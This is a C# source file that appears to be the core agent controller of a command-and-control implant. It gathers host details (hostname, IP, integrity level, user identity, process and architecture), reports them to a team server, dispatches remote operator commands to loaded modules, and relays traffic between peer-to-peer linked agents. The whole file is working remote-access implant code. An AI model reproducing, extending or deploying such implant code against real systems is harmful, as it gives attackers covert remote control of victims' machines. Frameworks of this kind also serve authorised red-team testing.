using Agent.Controllers;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

public class AgentController
{
    AgentStatus AgentStatus;

    ConfigController Config;
    CryptoController Crypto;
    P2PController P2P;
    
    public ICommModule CommModule { get; private set; }
    public AgentMetadata AgentMetadata { get; private set; }
    public List<AgentModuleInfo> AgentModules { get; private set; } = new List<AgentModuleInfo>();

    public delegate void OnAgentCommand(byte[] data);
    
    public AgentController(ConfigController config, CryptoController crypto, ICommModule commModule)
    {
        AgentStatus = AgentStatus.Starting;

        Config = config;
        Crypto = crypto;
        CommModule = commModule;
    }

    public void Init(string agentID, string parentAgentID)
    {
        AgentMetadata = new AgentMetadata
        {
            AgentID = agentID,
            ParentAgentID = parentAgentID,
            Hostname = Helpers.GetHostname,
            IPAddress = Helpers.GetIpAddress,
            Integrity = Helpers.GetIntegrity,
            Identity = Helpers.GetIdentity,
            ProcessName = Helpers.GetProcessName,
            ProcessID = Helpers.GetProcessId,
            Arch = Helpers.GetArch,
            CLR = Helpers.GetCLRVersion
        };

        P2P = new P2PController(this);
    }

    public void RegisterAgentModule(IAgentModule module)
    {
        module.Init(this, Config);

        var info = module.GetModuleInfo();

        AgentModules.Add(info);

        if (info.NotifyTeamServer)
        {
            SendData(new AgentMessage
            {
                Metadata = AgentMetadata,
                Data = new C2Data { Module = "Core", Command = "RegisterAgentModule", Data = Serialisation.SerialiseData(info) }
            });
        }
    }

    public void Start()
    {
        AgentStatus = AgentStatus.Running;

        CommModule.SetMetadata(AgentMetadata);
        CommModule.Start();
        P2P.Start();

        while (AgentStatus == AgentStatus.Running)
        {
            if (CommModule.RecvData(out AgentMessage message))
            {
                HandleMessage(message);
            }
        }
    }

    public void Stop()
    {
        AgentStatus = AgentStatus.Stopped;
    }

    public void SendOutput(string output)
    {
        SendData(new AgentMessage
        {
            IdempotencyKey = Guid.NewGuid().ToString(),
            Metadata = AgentMetadata,
            Data = new C2Data { Module = "Core", Command = "AgentOutput", Data = Encoding.UTF8.GetBytes(output) }
        });
    }

    public void SendModuleData(string module, string command, byte[] data)
    {
        SendData(new AgentMessage
        {
            IdempotencyKey = Guid.NewGuid().ToString(),
            Metadata = AgentMetadata,
            Data = new C2Data { AgentID = AgentMetadata.AgentID, Module = module, Command = command, Data = data }
        });
    }

    public void SendError(string error)
    {
        SendData(new AgentMessage
        {
            IdempotencyKey = Guid.NewGuid().ToString(),
            Metadata = AgentMetadata,
            Data = new C2Data { Module = "Core", Command = "AgentError", Data = Encoding.UTF8.GetBytes(error) }
        });
    }

    private void SendData(AgentMessage message)
    {
        CommModule.SendData(message);
    }

    private void HandleMessage(AgentMessage message)
    {
        if (string.IsNullOrEmpty(message.Data.AgentID) || message.Data.AgentID.Equals(AgentMetadata.AgentID, StringComparison.OrdinalIgnoreCase))    // message is for this agent
        {
            if (!string.IsNullOrEmpty(message.Data.Module))
            {
                try
                {
                    var callBack = AgentModules
                    .Where(m => m.Name.Equals(message.Data.Module, StringComparison.OrdinalIgnoreCase))
                    .Select(m => m.Commands).FirstOrDefault()
                    .Where(c => c.Name.Equals(message.Data.Command, StringComparison.OrdinalIgnoreCase))
                    .Select(c => c.CallBack).FirstOrDefault();

                    callBack?.Invoke(message.Data.Data);
                }
                catch (Exception e)
                {
                    SendError(e.Message);
                }
            }
        }
        else // for a p2p agent
        {
            P2P.BroadcastMessage(message); // very lazy approach until i can figure out a solution
        }
    }

    public void AddP2PAgent(string hostname, ICommModule module)
    {
        module.Init(Config, Crypto);
        P2P.LinkAgent(hostname, module);
    }

    public void SetParentAgent(string agentID)
    {
        AgentMetadata.ParentAgentID = agentID;
    }
}